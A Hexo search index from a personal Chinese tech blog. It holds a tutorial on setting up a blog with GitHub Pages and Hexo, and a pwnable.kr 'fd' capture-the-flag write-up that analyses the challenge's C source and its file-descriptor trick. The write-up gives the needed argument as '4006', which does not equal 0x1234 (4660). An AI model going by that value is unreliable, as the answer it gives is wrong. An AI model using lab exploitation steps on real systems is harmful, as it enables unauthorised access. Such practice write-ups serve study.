<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>一篇文章教会你搭建自己的博客</title>
    <url>/2020/12/01/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>​    想搭建一个博客很久了，但最近才着手做了这个事。使用博客记录一下平时自己的学习内容，同时也逼迫自己坚持学习。</p>
<p>​    这里采用GitHub+Hexo搭建博客，可以选择买一个.com域名(啥域名都被注册了。。退而求其次整个cn吧，还便宜)，这样输入URL比较有逼格。记得提前买域名，因为要实名认证审核。</p>
<h1 id="Git下载"><a href="#Git下载" class="headerlink" title="Git下载"></a>Git下载</h1><p>​    首先需要去注册一个GitHub账号，这步省略不说。之后，需要在本地下载一个GitGub客户端，可以去<a href="https://git-scm.com/">Git官网</a>进行下载，这里最新版本是2.29.2。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116092100527.png" alt="image-20201116092100527"></p>
<p>​    安装过程可以配置一些参数，参考链接<a href="https://zhuanlan.zhihu.com/p/103325381">参数配置</a>，安装完成后，在空白处点击鼠标右键，会出现如下图标：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116203201882.png" alt="image-20201116203201882"></p>
<p>​    之后打开Git控制台，输入git即可显示安装后的git信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116203356662.png" alt="image-20201116203356662"></p>
<h1 id="绑定GitHub及文件管理"><a href="#绑定GitHub及文件管理" class="headerlink" title="绑定GitHub及文件管理"></a>绑定GitHub及文件管理</h1><h2 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h2><p>​    虽然可以直接使用GitHub进行文件的上传，但是并不是很好用，所以这里还是选择将git与我们的GitGub账号绑定，利用SSH进行文件的传输。</p>
<p>   Windows下Git的用法 和用Liunx下进行GitGub管理类似，首先得生成SSH公钥。利用公钥的好处在于不用每次都进行用户的登陆，使用便捷。使用Windows下的git生成SSH公钥、私钥和将其添加到GitGub的步骤如下：</p>
<ol>
<li>一般来说安装选了Git Bash的话，会默认安装SSH。可以打开终端输入ssh命令来查看本机是否装了SSH，如下可以看出已经装了ssh。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116215113286.png" alt="image-20201116215113286"></p>
<p>​    未安装可以用命令apt-get ssh安装</p>
<ol start="2">
<li>接着就是对密钥的生成，首先输入ssh-keygen -t  rsa命令，表示我们指定RSA算法进行密钥的生成，然后回车后手动输入要保存key的目录和文件，这里不输入选择默认就好(想输入也行，都无所谓)。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201116215903303.png" alt="image-20201116215903303"></p>
<p>​    这里说明一下在不同系统中，ssh目录的位置：</p>
<ul>
<li>Linux：~/.ssh</li>
<li>Mac：~/.ssh</li>
<li>Windows 10：C:/Users/username/.ssh</li>
</ul>
<ol start="3">
<li>然后就可以找到我们的公钥，存储在id_ras.pub中，将其内容复制然后添加到GitHub中即可，可以直接利用控制台进行cat进行查看：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201117212024815.png" alt="image-20201117212024815"></p>
<ol start="4">
<li>去GitHub添加，在Setting下的SSH Keys中，添加完成后如图：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201117212136519.png" alt="image-20201117212136519"></p>
<ol start="5">
<li>紧接着去验证是否成功，键入命令ssh -T <a href="mailto:&#103;&#105;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#x6d;">&#103;&#105;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#x6d;</a>进行链接，首次验证填yes就好：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201117212409292.png" alt="image-20201117212409292"></p>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><p>​    第一次进行Git仓库的管理，本地是没有git仓库的，这时需要经历如下的步骤，然后使得可以操控远程仓库进行文件管理：</p>
<ul>
<li>首先直接将远程仓库clone到本地</li>
<li>然后将文件添加并commit到本地仓库</li>
<li>最后将本地仓库的内容push到远程仓库</li>
</ul>
<p>实际操作如下：</p>
<ol>
<li>首先去打开自己的项目，然后查看项目地址，这里我用到了之前已经使用的仓库：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201117212908672.png" alt="image-20201117212908672"></p>
<ol start="2">
<li>接着利用git clone 命令将远程仓库clone到本地，用SSH链接和URL链接都行：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128224437869.png" alt="image-20201128224437869"></p>
<ol start="3">
<li>clone成功后，找和到本地仓库路径，查看内容是否和远程仓库一致：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128225757960.png" alt="image-20201128225757960"></p>
<ol start="4">
<li>在当前路径下进行的操作，并不能及时反映到本地仓库和远程仓库，还需要将其git add添加到缓冲区，然后git commit提交到本地仓库，最后再push到远程仓库才算完整步骤，具体操作如下：</li>
</ol>
<ul>
<li>这里新建一个test.txt的文件作为测试，利用vim编辑test.txt，并随意写入一段内容，然后利用git status命令查看仓库状态：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128230537086.png" alt="image-20201128230537086"></p>
<p>上述可见，会提示刚刚创建的测试文件test.txt并没有被追踪，所以接下来还需要将文件添加到“临时缓冲区”，然后才能进行commit操作，第一次进行提交操作会提示输入用户名和密码，正常输入后即可完成提交，这里记得在commit时，用-m参数对于提交操作进行描述，方便后续进行日志查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128231603100.png" alt="image-20201128231603100"></p>
<ul>
<li>想要查看提交状态，课可以使用命令git log进行提交日志的查看：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128231714178.png" alt="image-20201128231714178"></p>
<ul>
<li>最后利用命令git push origin master将本地仓库提交到远程仓库，其中origin是远程主机的名字，这里我在提交时遇到一个问题”failed to push some  refs to git”</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128232757143.png" alt="image-20201128232757143"></p>
<p>该报错主要问题是在这期间对github上的远程仓库进行了修改，所以要用命令git pull –rebase origin master进行更新，然后再次提交即可成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128233248440.png" alt="image-20201128233248440"></p>
<p>打开github进行查看，确实是提交成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128233347882.png" alt="image-20201128233347882"></p>
<ul>
<li>另外要想删除一个文件利用git rm命令，具体操作可以参考下图：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129111140260.png" alt="image-20201129111140260"></p>
<p>其余还有很多操作命令，留待大家自己琢磨。</p>
<h1 id="安装node-js和Hexo"><a href="#安装node-js和Hexo" class="headerlink" title="安装node.js和Hexo"></a>安装node.js和Hexo</h1><p>在<a href="https://nodejs.org/en/">Node.js官网</a>下载最新的node.js，然后进行安装，傻瓜式Next安装操作，这里注意最好还是安装在C盘之外的盘符中，完成后cmd命令行验证是否有环境变量，验证是否安装成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129181551763.png" alt="image-20201129181551763"></p>
<p>然后我们需要配置一下npm在安装全局模块时的路径和缓存cache的路径。默认情况下，在进行模块安装时，路径为C盘，所以需要手动修改到其它盘。具体操作是：</p>
<ul>
<li>在node.js的安装目录下，新建两个文件夹node_global、node_cache：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129185223857.png" alt="image-20201129185223857"></p>
<ul>
<li>cmd中键入命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set prefix node_global_path</span><br><span class="line">npm config set cache node_cache_path</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129185538116.png" alt="image-20201129185538116"></p>
<ul>
<li><p>在系统变量下新建一个变量，变量名为”NODE_PATH”，变量值为”D:\Program Files\nodejs\node_modules”。并将nmp对应的路径修改为”D:\Program Files\nodejs\node_global”</p>
</li>
<li><p>验证测试，利用命令npm install -g webpack-cli 安装webpack模块进行测试，成功安装后该模块被放在了我们新建的node_global中：</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129191523497.png" alt="image-20201129191523497"></p>
<p>这里要注意，为什么我要安装webpack的CLI，因为在webpack3中，webpack本身和他的CLI都是在一个包中的，但是在最新的webpack4中，这两者被分开了，如果用webpack单独安装，查看版本时会显示如下错误，提示CLI不存在。这种情况下若想使用webpack命令，需要进入“node_modules/.bin/webpack”才能执行命令：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129201800613.png" alt="image-20201129201800613"></p>
<p>所以需要全局安装webpack-cli，这样就不需要进入bin目录，和之前版本操作就一样了，这里如果已经单独安装webpack了，可以使用如下命令重新安装webpack-cli：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129202140842.png" alt="image-20201129202140842"></p>
<h1 id="Hexo的安装"><a href="#Hexo的安装" class="headerlink" title="Hexo的安装"></a>Hexo的安装</h1><ul>
<li>Hexo是搭建个人博客最常用到的框架，通过npm install -g hexo-cli进行安装。新建一个Blog文件夹，然后Git Bash终端进入Blog目录，键入npm命令安装Hexo，因为有墙的关系，所以经常会安装错误，可以手动修改一下源地址为淘宝的NPM镜像源：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set registry http://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure>

<ul>
<li>安装完成后输入hexo init命令进行初始化，如果卡在下述提示不动，说明因为墙导致从github下载hexo库出问题，可以选择切换一下手机热点(简单，亲测有效)，或者设置一个github代理：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129204626379.png" alt="image-20201129204626379"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129204725555.png" alt="image-20201129204725555"></p>
<ul>
<li>之后用hexo g进行静态部署：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129204851432.png" alt="image-20201129204851432"></p>
<ul>
<li>网页部署完成后，用hexo s命令运行server，然后查看localhost:4000即为博客网页：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129210202166.png" alt="image-20201129210202166"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129210058129.png" alt="image-20201129210058129"></p>
<h1 id="将Hexo部署到GitHub"><a href="#将Hexo部署到GitHub" class="headerlink" title="将Hexo部署到GitHub"></a>将Hexo部署到GitHub</h1><ul>
<li>首先我们得去GitHub上创建一个对应的仓库，要注意对于仓库的名称尽量写为<code>用户名.github.io</code>的形式(一定记住用户名命名)，不然会存在一些问题。因为这个名称会对应博客的网站，而且博客的图片显示有问题(亲测)，所以建议还是用我上面那个方式命名，除非你买个域名。创建成功后拿到仓库地址。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129230705411.png" alt="image-20201129230705411"></p>
<p>在setting下找到GitHub Pages，将Source设置为master</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129232010727.png" alt="image-20201129232010727"></p>
<ul>
<li>然后就是将hexo部署到GitHub上，首先找到我们的Blog文件夹，打开_config.yml文件进行编辑：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129215432862.png" alt="image-20201129215432862"></p>
<p>在文件末尾处添加如下内容，主要是自己的仓库地址：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129230733432.png" alt="image-20201129230733432"></p>
<ul>
<li>接下来就是在Git Bash中安装Git部署插件，在Blog下执行npm install hexo-deployer-git –save：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129220108991.png" alt="image-20201129220108991"></p>
<ul>
<li>完成后，使用如下三个命令进行部署三步曲：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean    //清除缓存文件db.json和已生成的静态文件public</span><br><span class="line"> </span><br><span class="line">hexo generate  //生成网站静态文件到默认设置的public文件夹，可以用 hexo g 缩写</span><br><span class="line"> </span><br><span class="line">hexo deploy   //部署文章，可以用 hexo d 缩写</span><br></pre></td></tr></table></figure>

<p>完成后使用 https://用户名.github.io即可登陆到博客</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129231810031.png" alt="image-20201129231810031"></p>
<h1 id="购买域名并绑定"><a href="#购买域名并绑定" class="headerlink" title="购买域名并绑定"></a>购买域名并绑定</h1><p>现在的域名是带了github.io的，比较low，还是尽量花点钱买一个喜欢的域名，这样访问时也比较有逼格。</p>
<p>我这里选择<a href="https://wanwang.aliyun.com/?spm=5176.12901015.0.i12901015.7dd4525cudG4ZB">阿里云</a>进行购买，由于我想要的.com域名被注册了。。。只能选个.cn域名了。买域名步骤就不记录了，有钱就行，记得实名认证。</p>
<p><strong>解析域名</strong>：</p>
<ul>
<li>实名认证后，接着就是去解析一下域名，找到应列表中已购买的域名，解析进入：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130221219736.png" alt="image-20201130221219736"></p>
<p>添加两个记录(主机记录分别为@和www)，其中ip地址为之前的 用户名.github.io的地址，可以去ping一下获取，示例如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130225922939.png" alt="image-20201130225922939"></p>
<ul>
<li>接着去Blog/source下添加一个CHAME文件，写入域名，这里不加www就可以做到访问不带www也可以访问到：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130230403385.png" alt="image-20201130230403385"></p>
<ul>
<li>然后部署三步曲，这是后去GitHub上看，CHAME被添加到了项目中，打开setting，下拉就可以看到域名已被添加了：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130230901317.png" alt="image-20201130230901317"></p>
<p>如果在项目中没有CHAME文件可以自己手动添加一个，只要保证上述domain中有自己的domain就行。</p>
<ul>
<li>就这样，输入hskull.cn即可到达我的博客：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130231735139.png" alt="image-20201130231735139"></p>
<h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><p>默认的主题肯定是要换的，这毋庸置疑。hexo有很多开源的主题可以使用，可以自己去进行挑选喜欢的，作为一个技术分享为主的博客，那主题简洁明了就好，所以还是选择了最经典的NexT。(换主题了，推荐Butterfy，就是我现在用的主题，非常好看，真香。)</p>
<ul>
<li><p>下载NexT主题,下载最新版本的主题，我下载时为NexT v7.8.0，GitHub地址：<a href="https://github.com/theme-next/hexo-theme-next">/theme-next/hexo-theme-next</a>。</p>
<p>注：一些教程依旧是NexT V5的版本，其仓库为<a href="https://github.com/iissnan/hexo-theme-next">lissnan</a>，依据官方说法，我们还是使用新版的为好，之前我下的旧版本就有很多错误。</p>
</li>
<li><p>主题的配置都似乎将主题克隆到Blog下的themes目录，所以我们进入Blog目录下，执行如下命令进行克隆：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p>如果出现下述错误：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201201225211259.png" alt="image-20201201225211259"></p>
<p>修改为下述命令再次下载:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<ul>
<li>任何教程中都会提及两份重要的配置文件，名称为<code>_config.yml</code>，分别为：<ul>
<li>位于站点根目录下的<strong>站点配置文件</strong>，用于网站的基础配置</li>
<li>位于themes目录下的<strong>主题配置文件</strong>，用于主题相关的配置</li>
</ul>
</li>
</ul>
<p>当下载好主题后，先进行一个初步配置使得主题上线，看看效果。先打开站点配置文件，修改基础信息和设置主题：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: hskull   </span><br><span class="line">subtitle: hskull</span><br><span class="line">description: 我的博客</span><br><span class="line">keywords: </span><br><span class="line">author: hskull</span><br><span class="line">language: zh-Ch       #语言依据主题内languages下存储的语言设置,旧版为zh-Hans</span><br><span class="line">timezone: Asia/BeiJing    #时区，默认依据电脑时间</span><br><span class="line">。。。</span><br><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">#theme: landscape</span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure>

<p>然后打开主题的配置文件，搜索Schemes，然后选择一个风格，几个风格介绍如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</span><br><span class="line">Mist - Muse 的紧凑版本，整洁有序的单栏外观</span><br><span class="line">Pisces - 双栏 Scheme，小家碧玉似的清新</span><br><span class="line">Gemini - 新款，似乎用的最多，但看不出和Pisces的区别。。。</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201201230559669.png" alt="image-20201201230559669"></p>
<ul>
<li>使用旧版的hexo后，完成上述配置后，进行部署三步曲，完成后去打开博客，就呈现了如下的效果：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201201232721018.png" alt="image-20201201232721018"></p>
<p>失败了，查询原因后发现时是hexo再5.0之后把swig给删除了，它是JS模板引擎，用于渲染页面，执行命令npm  install hexo-renderer-swig下载，之后继续部署，显示成功:</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201201233741081.png" alt="image-20201201233741081"></p>
<p> 所以建议还是下载hexo 6.x之后版本。</p>
<p>进行到这一步后，你应该已经迫不及待的想发布一篇文章看看了，如果想继续美化界面，可以去参考网上大佬们的教程，这里不再献丑。</p>
<h1 id="发布第一篇文章"><a href="#发布第一篇文章" class="headerlink" title="发布第一篇文章"></a>发布第一篇文章</h1><ul>
<li>使用命令创建文章：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new [layout] &lt;title&gt;</span>      </span><br><span class="line"><span class="meta">#</span><span class="bash">这里layout选填，默认为Post，可以通过修改 _config.yml 中的 default_layout 参数来指定默认布局</span></span><br></pre></td></tr></table></figure>

<p>该命令会在/sources/_posts下创建一个title.md的文件，然后就可以编辑md文件写自己的文章了。也可以直接将写好的md文件放入对于目录下，配置号下述属性即可。</p>
<ul>
<li>打开创建的模板md文件，开头可以看见三个模板的配置属性，进行配置：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201202000040602.png"></p>
<p>另外还有一些其它的配置(Scaffold)如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>layout</td>
<td>布局</td>
</tr>
<tr>
<td>updated</td>
<td>更新日期</td>
</tr>
<tr>
<td>comment</td>
<td>开启文章的评论功能</td>
</tr>
<tr>
<td>categories</td>
<td>分类</td>
</tr>
<tr>
<td>permalink</td>
<td>覆盖文章网站</td>
</tr>
<tr>
<td>keywords</td>
<td>仅用于 meta 标签和 Open Graph 的关键词（不推荐使用）</td>
</tr>
</tbody></table>
<ul>
<li> 接下来hexo s本地测试一下，成功完成文章发布：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201202005452612.png" alt="image-20201202005452612"></p>
<p>你也可以部署三步曲进行部署，然后用域名进入测试，结果一般都是ok的。</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之01-fd</title>
    <url>/2021/08/11/pwnable/pwnable.kr%E7%B3%BB%E5%88%9701-fd/</url>
    <content><![CDATA[<p><strong>题目：</strong></p>
<p>​    该题是第一道题，通过描述来看是和Linux描述符相关的题目，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730162821.png"></p>
<p>​    首先使用ssh远程链接linux服务器，括号中为密码guest，链接后如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730163010.png"></p>
<p>​    查看文件，其中用于登录的fd用户，对于flag并无任何读写权限，而可以可能到fd对于fd.c具有读取权限，所以我们可以查看fd.c的代码进行漏洞利用来获取flag信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730170620.png"></p>
<p>​    fd.c代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ol>
<li> fd通过参数(argv[1])-0x1234来计算得到</li>
<li> fd控制read读取到buf的内容，read函数限定了向buf中写入的内容为32字节，没有利用的可能</li>
<li> 通过buf的内容和”LERMEWIN”做比较来cat flag得到flag内容，这里存在一个问题，刚才看到权限的时候，flag并没有权限去读取，为什么运行fd之后，就可以cat flag了。这是应为fd和flag都有着同个所有用户fd_pwn，当fd运行起来后，其本身对应的权限就临时会变为fd_pwn，而fd_pwn对于flag是有读取权限的，所以就可以cat flag了。</li>
</ol>
<p> <strong>文件描述符</strong></p>
<p>参考<a href="https://zhuanlan.zhihu.com/p/376099115">Linux 下 C/C++ 输入输出</a></p>
<p>​    观察代码，这里在分析前需要先了解点Linux下文件描述符的知识，在Linux下启动一个程序时，会打开三个文件描述符0、1、2，Linux内核会管理文件描述符及其背后的文件是什么，所以可以使用<strong>系统调用</strong><code>read/write</code>往0、1、2这三个文件描述符里读取/写入内容，这三个文件描述符一般都会链接到终端屏幕上。可以在终端数如tty命令来查看自己终端所绑定的输出位置，也可以使用<code>ls -l /proc/进程pid/fd</code>来查看具体进程打开的所有fd，可以看到很多程序的并没有链接到终端中，而是连接到了文件/套接字中。单无论是输入/输出, 其最终都是要通过系统调用, 读取 0 号 fd, 或者写入 1/2 号 fd。</p>
<p>​    在C标准输入输出中，为了尽可能不进行系统调用，大佬们想出了缓存，也就是常说的<code>stdin</code>、<code>stdout</code>、<code>stderr</code>，这三个东西在C标准库中实现，实际上对应的是<code>FILE*</code>，分别指向了C标准库种得<code>_IO_2_1_stdin_, _IO_2_1_stdout_, _IO_2_1_stderr_</code>这三个FILE，这三个FILE主要就是用来负责管理缓存然后在需要的时候进行<code>read/write</code>系统调用，得到新的输入或者进行真正的输出。</p>
<p><strong>继续分析：</strong></p>
<p>​    了解了文件描述符的知识后，我们继续看fd程序，可以发现要拿到flag的前提是buf内容为LETEMEWIN，而我们唯一能控制输入的地方在控制台，所以read用到的fd就需要代表终端才能将需要的内容写入buf。所以就要使得fd为stdin也就是0，那么第一个参数argv[1]就要为0x1234也就是字符串”4006”。</p>
<p>​    分析完毕后进行验证，成功得到flg：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210805182143.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之02-collision</title>
